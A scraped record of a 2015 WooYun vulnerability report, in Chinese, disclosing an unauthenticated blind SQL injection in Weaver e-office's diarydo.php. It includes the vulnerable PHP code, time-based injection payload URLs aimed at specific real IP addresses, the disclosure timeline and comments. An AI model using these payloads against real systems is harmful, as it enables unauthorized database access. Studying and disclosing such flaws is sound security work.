{"id": 19356, "wybug_id": "wooyun-2015-0105517", "wybug_title": "泛微e-office无需登录注入2", "wybug_corp": "泛微e-office", "wybug_author": "phith0n", "wybug_date": "2015-04-07 10:12", "wybug_open_date": "2015-07-09 17:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向公众公开  简要描述： 昨天交的2，跟我大哥pandas交的重复了。所以再来个2，应该没重复了。继续附带验证脚本。 详细说明：  解密源码后在/E-mobile/diarydo.php\ninclude_once( \"inc/utility_all.php\" );include_once( \"inc/conn.php\" );include_once( \"api/diary.class.php\" );include_once( \"E-mobile/func_all.php\" );$diff = $_REQUEST['diff'];switch ( $diff ){\t\t\t\tcase \"reply\" :\t\t\t\t\t\t\t\t$Diary = new diary( );\t\t\t\t\t\t\t\t$replyinfor = array( );\t\t\t\t\t\t\t\t$replyinfor['content'] = $_REQUEST['content'];\t\t\t\t\t\t\t\t$replyinfor['diaryid'] = $_REQUEST['diary_id'];\t\t\t\t\t\t\t\t$replyinfor['useid'] = $_REQUEST['user_id'];\t\t\t\t\t\t\t\t$replyinfor['replytime'] = date( \"Y-m-d H:i:s\", time( ) );\t\t\t\t\t\t\t\t$check = $Diary->New_Reply_Diary( $y );\t\t\t\t\t\t\t\techo \"success\";\t\t\t\t\t\t\t\tbreak;\n执行$Diary->New_Reply_Diary( $y );，跟进New_Reply_Diary函数：\npublic function New_Reply_Diary( $info )\t\t\t\t{\t\t\t\t\t\t\t\tglobal $connection;\t\t\t\t\t\t\t\t$sql = \"INSERT INTO diary_review \\r\\n\\t              (DIA_ID,USER_ID,DIA_RE_CONTENT,DIA_RE_DATE,DIA_RE_PARENT_ID) \\r\\n\\t\\t\\t\\t  VALUES \\r\\n\\t\\t\\t\\t  (\".$info['diaryid'].\",'\".$info['useid'].\"','\".$info['content'].\"',\\r\\n\\t\\t\\t\\t\\t'\".$info['replytime'].\"',0)\\r\\n\\t\\t\\t    \";\t\t\t\t\t\t\t\texequery( $connection, $sql );\t\t\t\t}\n$info['diaryid']直接插入insert函数，没有引号。造成注入。因为没有回显，所以我写了个盲注脚本，跑user()做示范。不过脚本里用了sleep()函数，可能有些mysql版本低的没有这个函数，修改成banchmark即可。   漏洞证明：  http://61.163.107.26:8082/E-mobile/diarydo.php?diff=reply&diary_id=sleep(if(ord(substr(user(),1,1))=114,5,0))http://219.232.254.131:8082/E-mobile/diarydo.php?diff=reply&diary_id=if(ord(substr(user(),1,1))%3E0,benchmark(500000,md5(2)),0)http://122.224.149.30:8082/E-mobile/diarydo.php?diff=reply&diary_id=sleep(if(ord(substr(user(),1,1))=114,5,0))脚本截图：\n\n延时注入：\n\n   修复方案：  过滤   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-04-10 17:25 厂商回复： CNVD未能确认所述情况，将由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-07 10:42 |    \t\t岩少 \t\t\t( 普通白帽子  |\t\t\t        Rank:586 漏洞数:171        | 破晓团队)\t\t \n  前排啊……    \n     2015-04-07 11:03 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  果然又是大牛    \n     2015-04-07 11:45 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  您好！感谢您对CNVD的支持。CNVD工作人员已对漏洞细节进行复现，但没有获取到具体数据库信息。商请提供能测试出数据库信息的语句，以便CNVD测试复现。祝好！    \n     2015-04-07 11:46 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  您好！感谢您对CNVD的支持。CNVD工作人员已对漏洞细节进行复现，但没有获取到具体数据库信息。商请提供能测试出数据库信息的语句，发送至vreport<vreport@cert.org.cn>邮箱，以便CNVD测试复现。祝好！    \n     2015-04-07 19:33 |    \t\tSunshie \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:10        | http://phpinfo.me)\t\t \n  你关注的白帽子 phith0n 发表了漏洞 泛微e-office无需登录注入2    \n     2015-04-07 19:50 |    \t\t封停 \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:8        | 求老中医指路)\t\t \n  大牛好~    \n     2015-04-09 14:58 |    \t\tFire ant \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:26        | 他们回来了................)\t\t \n  你关注的白帽子 phith0n 发表了漏洞 泛微e-office无需登录注入2    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}